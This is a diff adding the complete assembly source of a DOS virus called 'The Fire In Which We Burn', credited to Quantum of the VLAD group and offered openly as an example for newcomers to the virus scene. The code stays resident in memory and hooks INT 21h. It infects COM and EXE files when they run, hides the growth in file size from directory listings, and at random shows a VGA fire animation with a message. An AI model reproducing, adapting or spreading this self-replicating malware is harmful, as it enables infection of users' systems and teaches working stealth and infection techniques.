@@ -1,0 +1,483 @@
+;
+; "The Fire In Which We Burn"  by Quantum / VLAD
+;
+; I was told recently that here at VLAD we may have done one too many
+; research viruses and as such we may have forgotten our roots.  So,
+; for the enjoyment of all who are still trying to learn to code or
+; are just now entering the scene, we have a minor stealth com/exe
+; infector.
+;
+; The payload is rather interesting. :)
+;
+
+db 0e9h
+dw offset vstart-103h
+vstart:
+push es
+db 0bdh
+recalc dw 0
+mov ax,1895h
+int 21h
+cmp ax,9595h
+jz ret2host
+
+mov ax,es
+dec ax
+mov ds,ax
+xor di,di
+cmp byte ptr [di],"Z"
+jnz ret2host
+
+sub word ptr [di+3],(vend-vstart)/16+1
+sub word ptr [di+12h],(vend-vstart)/16+1
+mov ax,[di+12h]
+
+mov es,ax
+push cs
+pop ds
+mov cx,(vend-vstart)/2+1
+lea si,[bp+offset vstart]
+xor di,di
+rep movsw
+
+push ds
+mov ds,cx
+mov si,84h
+mov di,offset oldi21-offset vstart
+movsw
+movsw
+mov word ptr [si-4],offset newi21-offset vstart
+mov word ptr [si-2],es
+pop ds
+
+ret2host:
+push cs
+pop ds
+push cs
+pop es
+in al,40h
+cmp al,53
+jnz nomessage
+call dodafire
+mov ah,9
+lea dx,[bp+offset message1]
+int 21h
+nomessage:
+pop ax
+cmp byte ptr ds:[bp+offset comexe],1
+jz exeret
+lea si,[bp+offset buf]
+mov di,0ffh
+inc di
+push di
+movsw
+movsb
+ret
+exeret:
+add ax,10h
+add ds:[bp+offset orgentrypoint+2],ax
+jmp $+2
+db 0eah
+orgentrypoint dw 0,0
+
+comexe db 0
+
+newi21:
+
+cmp ax,1895h
+jnz notcheck
+mov ah,al
+iret
+notcheck:
+xchg ah,al
+cmp al,4eh
+jz searchstealth
+cmp al,4fh
+jz searchstealth
+cmp al,11h
+jz dirstealth
+cmp al,12h
+jz dirstealth
+cmp al,4bh
+jz executing
+xchg ah,al
+onwiththeint:
+
+db 0eah
+oldi21 dw 0,0
+
+goi21:
+pushf
+call dword ptr cs:[offset oldi21-offset vstart]
+ret
+
+dirstealth:
+xchg ah,al
+call goi21
+pushf
+push ax
+push bx
+push cx
+push es
+
+mov ah,2fh
+call goi21
+
+cmp byte ptr es:[bx],0ffh
+jnz notxfcb
+add bx,7
+notxfcb:
+mov ax,es:[bx+1dh]
+call doesitdiv
+jnz nodirstealth
+sub word ptr es:[bx+1dh],vend-vstart ; won't return file to original size
+sbb word ptr es:[bx+1fh],0           ; but hey
+nodirstealth:
+
+pop es
+pop cx
+pop bx
+pop ax
+
+popf
+retf 2
+
+searchstealth:
+xchg ah,al
+call goi21
+pushf
+push ax
+push bx
+push cx
+push es
+
+mov ah,2fh
+call goi21
+
+mov ax,es:[bx+1ah]
+call doesitdiv
+jnz nostealth
+sub word ptr es:[bx+1ah],vend-vstart   ; this will not return the file to
+sbb word ptr es:[bx+1ah+2],0           ; original size :(
+nostealth:
+
+pop es
+pop cx
+pop bx
+pop ax
+
+popf
+retf 2
+
+executing:
+push ax
+push bx
+push cx
+push dx
+push si
+push di
+push ds
+push es
+
+mov ax,03d02h
+call goi21
+xchg bx,ax
+
+push cs
+push cs
+pop ds
+pop es
+
+mov ah,3fh
+mov cx,1ah
+mov dx,offset buf-offset vstart
+mov di,dx
+call goi21
+
+call seeke
+
+push ax
+call doesitdiv
+pop ax
+jz closedafile
+
+mov dx,"ZM"
+cmp word ptr [di],dx
+jz infectexe
+
+push ax
+
+sub ax,3
+mov [offset jmpback+1-offset vstart],ax
+mov [offset recalc-offset vstart],ax
+mov byte ptr [offset comexe-offset vstart],0
+
+pop ax
+call calccx
+xor dx,dx
+call writefile
+
+call seeks
+
+mov cx,3
+mov dx,offset jmpback-offset vstart
+call writefile
+jmp closedafile
+
+infectexe:
+
+mov byte ptr [offset comexe-offset vstart],1
+
+mov si,offset buf-offset vstart+14h
+mov di,offset orgentrypoint - offset vstart
+movsw
+movsw
+
+push ax
+mov cx,16
+div cx
+sub ax,[offset buf-offset vstart+8]
+mov [si-4],dx
+mov [si-2],ax
+sub dx,offset vstart
+mov word ptr [offset recalc-offset vstart],dx
+pop ax
+
+call calccx
+
+mov si,offset buf-offset vstart+2
+xor dx,dx
+add [si],cx
+adc [si+2],dx
+
+call writefile
+
+call seeks
+
+mov cx,1ah
+mov dx,offset buf-offset vstart
+call writefile
+
+closedafile:
+mov ah,3eh
+call goi21
+
+pop es
+pop ds
+pop di
+pop si
+pop dx
+pop cx
+pop bx
+pop ax
+jmp onwiththeint
+
+seeke:
+mov ax,04202h
+jmp seek
+seeks:
+mov ax,04200h
+seek:
+xor cx,cx
+xor dx,dx
+call goi21
+ret
+
+writefile:
+mov ah,40h
+call goi21
+ret
+
+calccx:
+mov cx,vend-vstart
+add ax,cx
+push cx
+mov cl,53
+div cl
+pop cx
+mov al,53
+sub al,ah
+xor ah,ah
+add cx,ax
+ret
+
+doesitdiv:
+mov cl,53
+div cl
+or ah,ah
+ret
+
+message1 db "You know, they say time is the fire in which we burn",13,10,"$"
+
+db "The Fire In Which We Burn by Quantum / VLAD"
+
+dodafire:
+; fire
+
+mov ax,13h
+int 10h
+
+mov ax,0a000h
+mov es,ax
+
+mov   dx,3c4h
+mov   ax,604h
+out   dx,ax
+mov   ax,0F02h
+out   dx,ax
+mov   dx,3D4h
+mov   ax,14h
+out   dx,ax
+mov   ax,0E317h
+out   dx,ax
+mov   al,9
+out   dx,al
+inc   dx
+in    al,dx
+and   al,0E0h
+add   al,7
+out   dx,al
+
+mov dx,3c8h
+xor ax,ax
+out dx,al
+inc dx
+palloop1:
+out dx,al
+push ax
+xor ax,ax
+out dx,al
+out dx,al
+pop ax
+inc ax
+cmp al,64
+jnz palloop1
+
+xor ax,ax
+palloop2:
+push ax
+mov al,63
+out dx,al
+pop ax
+out dx,al
+push ax
+xor ax,ax
+out dx,al
+pop ax
+inc ax
+cmp al,64
+jnz palloop2
+
+xor ax,ax
+palloop3:
+push ax
+mov al,63
+out dx,al
+out dx,al
+pop ax
+out dx,al
+inc ax
+cmp al,64
+jnz palloop3
+
+mov cx,255-192
+palloop4:
+mov al,63
+out dx,al
+out dx,al
+out dx,al
+loop palloop4
+
+toploop:
+
+push es
+pop ds
+push cs
+pop es
+
+mov di,offset vend
+xor si,si
+mov cx,80*(24+3)
+rep movsw
+
+mov cx,80
+loop2:
+in ax,40h
+rloop:
+dec ax
+jnz rloop
+in ax,40h
+xor ax,cx
+stosw
+loop loop2
+
+push ds
+pop es
+push cs
+pop ds
+
+xor dx,dx
+mov si,offset vend+80
+mov di,dx
+mov cx,3
+loop1:
+mov ax,dx
+mov al,[si-81]
+add al,[si-80]
+adc ah,dl
+add al,[si-79]
+adc ah,dl
+add al,[si-1]
+adc ah,dl
+add al,[si+1]
+adc ah,dl
+add al,[si+79]
+adc ah,dl
+add al,[si+80]
+adc ah,dl
+add al,[si+81]
+adc ah,dl
+or ax,ax
+jz noinc
+dec ax
+noinc:
+shr ax,cl
+stosb
+inc si
+cmp si,offset vend+80+80*(49+6)
+jnz loop1
+
+mov dx,3dah
+wv1:
+in al,dx
+test al,8
+jnz wv1
+
+wv2:
+in al,dx
+test al,8
+jz wv2
+
+mov ah,1
+int 16h
+jz toploop
+
+xor ax,ax
+int 16h
+
+mov ax,3
+int 10h
+
+int 20h
+
+ret
+
+jmpback db 0e9h,0,0
+
+buf:
+int 20h
+db 90h
+db 1ah dup (0)
+
+vend:
+
